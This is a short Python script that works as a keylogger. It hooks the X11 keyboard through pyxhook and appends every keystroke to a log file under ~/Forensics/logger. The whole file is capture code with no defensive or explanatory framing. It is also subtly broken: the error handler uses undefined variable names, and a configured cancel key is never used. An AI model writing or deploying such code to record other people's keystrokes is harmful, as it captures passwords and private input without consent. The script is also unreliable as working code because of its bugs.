import os
import pyxhook

logFile = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Forensics/logger/logger.txt')
)
cancelKey = ord(
    os.environ.get(
        'pyloggercancel',
        '`'
    )[0]
)
#if os.environ.get('pyloggerclean', None) is not None:
#    try:
#        os.remove(logFile)
#    except EnvironmentError:
#         pass

def KeyPress(event):
    with open(logFile, 'a') as f:
        f.write('{}\n'.format(event.Key))

new_hook = pyxhook.HookManager()
new_hook.KeyDown = KeyPress
new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as exception:
    message = 'Error while catching events:\n  {}'.format(exception)
    pyxhook.print_err(message)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
